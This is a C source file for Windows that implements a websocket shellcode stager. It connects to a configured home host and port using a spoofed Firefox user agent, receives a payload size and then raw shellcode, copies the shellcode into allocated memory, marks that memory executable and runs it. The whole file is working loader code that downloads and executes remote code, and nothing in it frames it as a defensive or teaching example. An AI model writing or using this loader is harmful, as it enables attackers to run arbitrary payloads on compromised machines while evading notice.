#include "../inc/ws.h"
#include "../inc/run.h"

void ws_error(const char *function_name) {

	printf("[!] %s\n[!] Error code: %d\n", function_name, GetLastError());

}

HINTERNET get_websocket() {

	HINTERNET ws			= NULL;
	HINTERNET request		= NULL;
	HINTERNET session_handle	= NULL;
	HINTERNET session_connect	= NULL;

	const wchar_t* user_agent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0";
	const wchar_t* ws_headers = L"Sec-WebSocket-Version: 13\r\nConnection: keep-alive, Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: PLWakIhVBU1uKjS7jBzJYh==";

	// Get a session handle

#ifdef PROXY
	session_handle = WinHttpOpen(user_agent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
#else
	session_handle = WinHttpOpen(user_agent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
#endif

	if (session_handle == NULL) {

		return NULL;
	
	}

	// Connect to the websocket server

	session_connect = WinHttpConnect(session_handle, HOME, PORT, 0);

	if (session_connect == NULL) {

		return NULL;

	}

	// Start the upgrade request

	request = WinHttpOpenRequest(session_connect, L"GET", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

	if (request == NULL) {
		
		return NULL;
	}

	if (!WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0)) {
	
		return NULL;
	}

	if (!WinHttpAddRequestHeaders(request, ws_headers, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {

		return NULL;

	}

	// Send the upgrade request

	if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 0, 0, 0, 0)) {
	
		return NULL;

	}

	// Receive the response

	if (!WinHttpReceiveResponse(request, 0)) {

		return NULL;

	}

	// Complete the upgrade and return the websocket

	ws = WinHttpWebSocketCompleteUpgrade(request, 0);

	if (ws == NULL) {

		return NULL;
	
	}

	WinHttpCloseHandle(request);
	WinHttpCloseHandle(session_connect);
	WinHttpCloseHandle(session_handle);

	request		= NULL;
	session_connect = NULL;
	session_handle	= NULL;

	return ws;
}

BOOL ws_load(const wchar_t* home, int port) {

	HINTERNET ws = NULL;

	// Get websocket handle

	ws = get_websocket();

	if (ws == NULL) {

		return FALSE;
	}

	// Recv shellcode size from websocket

	int filesize;
	size_t offset = 0;
	int tmp_filesize;
	DWORD bytes_read;
	unsigned char buffer[1024];
	WINHTTP_WEB_SOCKET_BUFFER_TYPE buffer_type;

	memset(buffer, 0, 1024);

	if (WinHttpWebSocketReceive(ws, buffer, 1024, &bytes_read, &buffer_type) != NO_ERROR) {

		WinHttpCloseHandle(ws);
		ws = NULL;

		return FALSE;

	}

	filesize = atoi(buffer);
	tmp_filesize = filesize;

	// Allocate memory for shellcode

	LPVOID shellcode = VirtualAlloc(NULL, filesize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (shellcode == NULL) {

		WinHttpCloseHandle(ws);
		ws = NULL;

		return FALSE;

	}

	// Recv shellcode into buffer

	while (tmp_filesize > 0) {

		memset(buffer, 0, 1024);

		if (WinHttpWebSocketReceive(ws, buffer, 1024, &bytes_read, &buffer_type) != NO_ERROR) {

			// Clean up

			VirtualFree(shellcode, 0, MEM_RELEASE);
			WinHttpCloseHandle(ws);
			ws = NULL;

			return FALSE;
		}

		if (bytes_read <= 0) {
			break;
		}

		// move shellcode to allocated memory

		printf("[+] %d bytes\n", bytes_read);

		memmove((unsigned char*)shellcode + offset, buffer, bytes_read);

		tmp_filesize -= bytes_read;
		offset += bytes_read;
	}

	printf("[+] %d Total bytes received.\n", offset);

	// Change shellcode permissions to RX

	DWORD old_prot;

	if (!VirtualProtect(shellcode, filesize, PAGE_EXECUTE_READ, &old_prot)) {

		// Clean up
	
		VirtualFree(shellcode, 0, MEM_RELEASE);
		WinHttpCloseHandle(ws);
		ws = NULL;

		return FALSE;

	}

	// Execute shellcode

	if (!execute(shellcode, filesize)) {

		VirtualFree(shellcode, 0, MEM_RELEASE);
		return FALSE;
	
	}

	// Clean up

	VirtualFree(shellcode, 0, MEM_RELEASE);
	WinHttpCloseHandle(ws);
	ws = NULL;

	return TRUE;
}
